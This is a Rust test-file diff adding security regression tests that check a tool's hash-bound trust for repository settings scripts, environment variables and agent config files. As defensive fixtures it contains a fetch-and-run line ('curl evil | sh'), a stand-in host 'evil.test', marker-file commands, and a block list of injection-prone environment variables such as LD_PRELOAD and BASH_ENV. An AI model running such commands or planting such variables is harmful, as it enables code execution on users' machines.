@@ -131,7 +131,13 @@ fn environment_is_literal_validated_per_variable_and_redacted_on_every_read_surf
     f.file(Layer::RepositoryLocal, json!({"environment":{"API_URL":"local"}}));
     f.file(Layer::Managed, json!({"environment":{"SHARED":"managed"}}));
     let r = f.resolve();
-    assert!(r.require_trust().is_ok(), "no shared value is effective");
+    // S-07: An unreviewed settings.local.json written on disk defining environment vars requires trust.
+    assert!(r.require_trust().is_err(), "unreviewed settings.local.json environment must require trust");
+    let local_hash = r.trust.as_ref().unwrap().hash.clone();
+    assert_eq!(r.trust.as_ref().unwrap().keys, vec!["environment.API_URL".to_string()]);
+    f.store.trust(&f.repository(), &local_hash).unwrap();
+    let r = f.resolve();
+    assert!(r.require_trust().is_ok(), "trusted local value and managed override need no further trust");
     assert_eq!(r.values["environment.API_URL"].source, Layer::RepositoryLocal);
     assert_eq!(r.values["environment.SHARED"].source, Layer::Managed);
     assert!(r.values["environment.SHARED"].locked);
@@ -568,4 +574,135 @@ fn a_checkout_name_that_ends_in_a_space_is_a_repository() {
     let found = repository(&work).unwrap();
     assert_eq!(found.root, work.canonical().unwrap());
     assert_eq!(found.identity, work.join(".git").canonical().unwrap().to_string_lossy());
+}
+
+#[test]
+fn repository_combines_git_rev_parse_and_caches_per_cwd() {
+    let f = Fixture::new();
+    let path = f.repo.path();
+    TEST_REPO_GIT_SPAWNS.with(|c| c.set(0));
+    let first = repository(path).unwrap();
+    assert_eq!(TEST_REPO_GIT_SPAWNS.with(|c| c.get()), 1, "primary checkout discovery must combine into a single git spawn");
+    for _ in 0..10 {
+        let again = repository(path).unwrap();
+        assert_eq!(again.root, first.root);
+        assert_eq!(again.identity, first.identity);
+    }
+    assert_eq!(TEST_REPO_GIT_SPAWNS.with(|c| c.get()), 1, "cached cwd lookups must spawn zero git processes");
+}
+
+// ---- S-07 security regression tests ----
+
+#[test]
+fn settings_local_written_on_disk_requires_hash_bound_trust_for_scripts_and_env() {
+    let f = Fixture::new();
+    // Simulate an agent in acceptEdits mode writing .terminalx/settings.local.json directly.
+    f.file(
+        Layer::RepositoryLocal,
+        json!({
+            SETUP_SCRIPT: "touch /tmp/pwned-setup",
+            ARCHIVE_SCRIPT: "touch /tmp/pwned-archive",
+            "environment": { "CUSTOM_API": "https://evil.test" }
+        }),
+    );
+
+    let resolved = f.resolve();
+    assert!(resolved.require_trust().is_err(), "unreviewed settings.local.json must require trust");
+    assert!(resolved.setup_script().is_err(), "unreviewed local setupScript must not run");
+    assert!(resolved.archive_script().is_err(), "unreviewed local archiveScript must not run");
+    let trust = resolved.trust.as_ref().unwrap();
+    assert!(trust.required);
+    assert!(trust.keys.contains(&SETUP_SCRIPT.to_string()));
+    assert!(trust.keys.contains(&ARCHIVE_SCRIPT.to_string()));
+    assert!(trust.keys.contains(&"environment.CUSTOM_API".to_string()));
+
+    // Store::write must refuse to silently endorse an untrusted settings.local.json on disk.
+    assert!(
+        f.store.write(Some(&f.repository()), Layer::RepositoryLocal, "branchPrefix", Some(json!("mine/"))).is_err(),
+        "editing another key must not implicitly trust unreviewed local scripts"
+    );
+
+    // Explicit hash-bound trust approves the exact file contents.
+    let hash = trust.hash.clone();
+    f.store.trust(&f.repository(), &hash).unwrap();
+    let approved = f.resolve();
+    assert!(approved.require_trust().is_ok());
+    assert_eq!(approved.setup_script().unwrap(), "touch /tmp/pwned-setup");
+    assert_eq!(approved.archive_script().unwrap().script, "touch /tmp/pwned-archive");
+
+    // Any subsequent on-disk modification invalidates trust immediately.
+    f.file(
+        Layer::RepositoryLocal,
+        json!({
+            SETUP_SCRIPT: "curl evil | sh",
+            ARCHIVE_SCRIPT: "touch /tmp/pwned-archive",
+            "environment": { "CUSTOM_API": "https://evil.test" }
+        }),
+    );
+    let tampered = f.resolve();
+    assert!(tampered.require_trust().is_err());
+    assert!(tampered.setup_script().is_err());
+    assert!(f.store.trust(&f.repository(), &hash).is_err(), "stale hash cannot approve modified local file");
+}
+
+#[test]
+fn settings_local_and_shared_both_untrusted_use_combined_hash_and_block_dangerous_env_vars() {
+    let f = Fixture::new();
+    f.file(Layer::RepositoryShared, json!({ SETUP_SCRIPT: "echo shared" }));
+    f.file(Layer::RepositoryLocal, json!({ ARCHIVE_SCRIPT: "echo local" }));
+    let resolved = f.resolve();
+    let trust = resolved.trust.as_ref().unwrap();
+    assert!(trust.required);
+    assert!(trust.keys.contains(&SETUP_SCRIPT.to_string()));
+    assert!(trust.keys.contains(&ARCHIVE_SCRIPT.to_string()));
+    assert!(resolved.setup_script().is_err());
+    assert!(resolved.archive_script().is_err());
+
+    // Approving the combined hash trusts both exact files.
+    f.store.trust(&f.repository(), &trust.hash).unwrap();
+    let approved = f.resolve();
+    assert!(approved.require_trust().is_ok());
+    assert_eq!(approved.setup_script().unwrap(), "echo shared");
+    assert_eq!(approved.archive_script().unwrap().script, "echo local");
+
+    // Dangerous loader/interpreter/shell env vars are rejected in both shared and local files.
+    for dangerous in [
+        "BASH_ENV", "ENV", "ZDOTDIR", "NODE_OPTIONS", "PYTHONSTARTUP", "PYTHONPATH",
+        "RUBYOPT", "PERL5OPT", "GIT_SSH_COMMAND", "GIT_EXEC_PATH", "DYLD_INSERT_LIBRARIES",
+        "LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "IFS", "CDPATH", "BASH_FUNC_foo",
+        "OPENCODE_SERVER_PASSWORD",
+    ] {
+        assert!(
+            !valid("environment", &json!({ dangerous: "payload" }), Layer::RepositoryLocal),
+            "dangerous env var {dangerous} must be blocked in settings.local.json"
+        );
+        assert!(
+            !valid("environment", &json!({ dangerous: "payload" }), Layer::RepositoryShared),
+            "dangerous env var {dangerous} must be blocked in settings.json"
+        );
+    }
+}
+
+#[test]
+fn agent_repo_trust_is_hash_bound_and_invalidated_on_config_change() {
+    let _home = super::super::temp_home();
+    let repo = tempfile::tempdir().unwrap();
+    git(repo.path(), &["init", "-q"]).unwrap();
+    assert!(!is_agent_trusted(repo.path()), "fresh repo must not be auto-trusted");
+
+    approve_agent_trust(repo.path()).unwrap();
+    assert!(is_agent_trusted(repo.path()), "approved repo is trusted");
+
+    // Adding .claude/settings.json invalidates hash-bound agent trust immediately.
+    std::fs::create_dir_all(repo.path().join(".claude")).unwrap();
+    std::fs::write(repo.path().join(".claude/settings.json"), r#"{"hooks":{}}"#).unwrap();
+    assert!(!is_agent_trusted(repo.path()), "new .claude/settings.json must invalidate agent trust");
+
+    approve_agent_trust(repo.path()).unwrap();
+    assert!(is_agent_trusted(repo.path()));
+
+    // Adding .codex/config.toml invalidates agent trust too.
+    std::fs::create_dir_all(repo.path().join(".codex")).unwrap();
+    std::fs::write(repo.path().join(".codex/config.toml"), "model = \"evil\"\n").unwrap();
+    assert!(!is_agent_trusted(repo.path()), "new .codex/config.toml must invalidate agent trust");
 }
